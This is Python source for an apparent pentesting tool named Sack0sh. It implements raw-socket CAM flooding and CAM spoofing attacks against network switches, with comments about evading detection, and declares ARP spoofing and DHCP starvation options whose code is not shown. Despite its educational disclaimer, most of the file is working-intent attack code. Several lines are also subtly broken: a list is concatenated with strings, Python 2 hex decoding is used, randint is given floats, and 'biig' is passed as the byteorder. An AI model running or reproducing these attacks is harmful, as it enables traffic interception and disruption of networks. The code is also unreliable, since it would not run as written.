import time
import socket
import random
import argparse


# ====================================
# ===== Presentation of the tool =====
# ====================================


print(r"""
  _________              __   _______         .__     
 /   _____/____    ____ |  | _\   _  \   _____|  |__  
 \_____  \\__  \ _/ ___\|  |/ /  /_\  \ /  ___/  |  \ 
 /        \/ __ \\  \___|    <\  \_/   \\___ \|   Y  \
/_______  (____  /\___  >__|_ \\_____  /____  >___|  /
        \/     \/     \/     \/      \/     \/     \/ 

Sack0sh is a pentensting tool to exploit the low layer vulnerabilities as CAM flooding, ARP spoofing, and other network layer attacks.
You must using linux to run this tool and you need to have root privileges to perform the attacks.
      
[IMPORTANT] Remember that this tool is for educational purposes only and should be used responsibly and legally. 
[IMPORTANT] Always obtain proper authorization before performing any security testing or attacks on networks or systems that you do not own or have explicit permission to test.
      """)


# =============================
# ===== Parsing arguments =====
# =============================


parser = argparse.ArgumentParser(
    prog='sack0sh.py',
    description='A pentesting tool to exploit the low layer vulnerabilities as CAM flooding, ARP spoofing, and other network layer attacks.'
)
parser.add_argument('-i', '--interface', type=str, required=True, help='Network interface to use for the attack')
parser.add_argument('-m', '--mac', type=str, help='MAC address of the victim (required for CAM Spoofing and ARP Spoofing attacks)')
parser.add_argument('-t', '--target', type=str, required=True, help='Target IP')
parser.add_argument('-t2', '--target2', type=str, help='Second target IP (depending on the attack)')
parser.add_argument('-a', '--attack', type=str, required=True, choices=['CF','CS', 'ARPS', 'DHCPSTARV'], help="""Type of attack to perform:
                    - CF: CAM Flooding
                    - CS: CAM Spoofing
                    - ARPS: ARP Spoofing
                    - DHCPSTARV: DHCP Starvation
                    """)
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output for more detailed attack information')
parser.add_argument('-vv', '--very-verbose', action='store_true', help='Enable very verbose output for maximum attack details and debugging information')
args = parser.parse_args()


# ===========================================
# ===== Common function for all attacks =====
# ===========================================


# List of common OUIs for popular manufacturers to generate realistic MAC addresses during CAM flooding and spoofing attacks
common_oui = {
    "Cisco": ["00:00:0C", "00:00:0C","00:01:42"],
    "Juniper": ["00:05:85", "00:0B:CA", "00:14:BF"],
    "Fortinet": ["00:09:0F", "00:1C:57", "90:6C:AC"],
    "Dell": ["00:14:22", "00:1A:A0", "00:21:70"],
    "HP": ["00:1E:0B", "3C:D9:2B", "5C:26:0A"],
    "Lenovo": ["00:1F:16", "3C:95:09", "4C:EB:42"],
    "Apple": ["28:CF:E9", "3C:07:54", "40:A6:D9"],
    "Samsung": ["28:39:26", "38:2D:E8", "5C:0A:5B"]
}

def gen_random_mac():
    oui = random.choice(list(common_oui.values()))
    mac = oui
    for i in range(0, 3):
        mac += str(":%02x" % (random.randint(0, 255))).decode('hex')
    return mac


# ========================
# ===== CAM Flooding =====
# ========================


def cam_flooding():
    print("[+] Starting CAM Flooding attack...")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((args.interface, 0))
    try:
        while True:
            time.sleep(random.randint(0.0000, 0.0005)) # Random sleep to avooid detection
            mac_src = gen_random_mac()
            if args.verbose or args.very_verbose:
                print(f"[INFO] Using interface: {args.interface}")
            if args.very_verbose:
                print(f"[DEBUG] Generated MAC adress: {mac_src}")
            mac_dst = "FF:FF:FF:FF:FF:FF" # Broadcast address to ensure the frame is prcessed by the switch
            eth_type = 0x0800 # IPv4
            payload = b"A" * 46 # Minimum Ethernet frame size
            packet = bytes.fromhex(mac_dst.replace(":", "")) + bytes.fromhex(mac_src.replace(":", "")) + eth_type.to_bytes(2, byteorder='big') + payload
            s.send(packet)
    except KeyboardInterrupt:
        print("[-] CAM Flooding attack stopped.")
        s.close()


# ========================
# ===== CAM Spoofing =====
# ========================


def cam_spoofing():
    print("[+] Starting CAM Spoofing attack...")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((args.interface, 0))
    with open(f"/sys/class/net/{args.interface}/address", "r") as f: 
        mac_src = f.read().strip() # Get the attacker MAC address from the network interface
    try:
        while True:
            time.sleep(random.randint(0.0000, 0.0005)) # Random sleep to avooid detection
            mac_dst = args.mac
            eth_type = 0x0800 # IPv4
            payload = b"A" * 46 # Minimum Ethernet fram size
            packet = bytes.fromhex(mac_dst.replace(":", "")) + bytes.fromhex(mac_src.replace(":", "")) + eth_type.to_bytes(2, byteorder='biig') + payload
            s.send(packet)
    except KeyboardInterrupt:
        print("[-] CAM Spoofing attack stopped.")
        s.close()


# ========================
# ===== ARP Spoofing =====
# ========================

